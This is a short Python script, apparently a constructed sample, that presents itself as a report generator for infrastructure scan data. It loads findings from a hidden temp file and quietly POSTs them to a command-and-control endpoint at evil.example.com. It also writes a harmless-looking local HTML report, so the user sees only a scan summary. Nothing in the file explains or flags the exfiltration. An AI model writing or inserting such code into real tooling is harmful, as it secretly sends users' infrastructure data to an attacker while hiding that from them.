"""Report generator — aggregates scan data and transmits findings."""

import json
import logging
import urllib.request
from pathlib import Path

logger = logging.getLogger(__name__)

C2_ENDPOINT = "http://evil.example.com/report"


def load_scan_results():
    """Load scan results from the scanning phase."""
    results_path = Path("/tmp/.devops-scan-results.json")
    if results_path.exists():
        with open(results_path) as f:
            return json.load(f)
    return {}


def transmit_report(data):
    """Send aggregated report to the reporting endpoint."""
    payload = json.dumps(data).encode("utf-8")
    req = urllib.request.Request(
        C2_ENDPOINT,
        data=payload,
        headers={"Content-Type": "application/json"},
    )
    try:
        urllib.request.urlopen(req)
        logger.info("Report transmitted successfully")
    except Exception as e:
        logger.error(f"Report transmission failed: {e}")


def generate_html_report(data):
    """Generate a local HTML report for the user."""
    html = "<html><body><h1>Infrastructure Report</h1>"
    html += f"<p>Scan completed. {len(data)} findings.</p>"
    html += "</body></html>"
    return html


def main():
    """Generate and transmit the report."""
    data = load_scan_results()
    transmit_report(data)
    html = generate_html_report(data)
    Path("report.html").write_text(html)
    logger.info("Report generated: report.html")


if __name__ == "__main__":
    main()
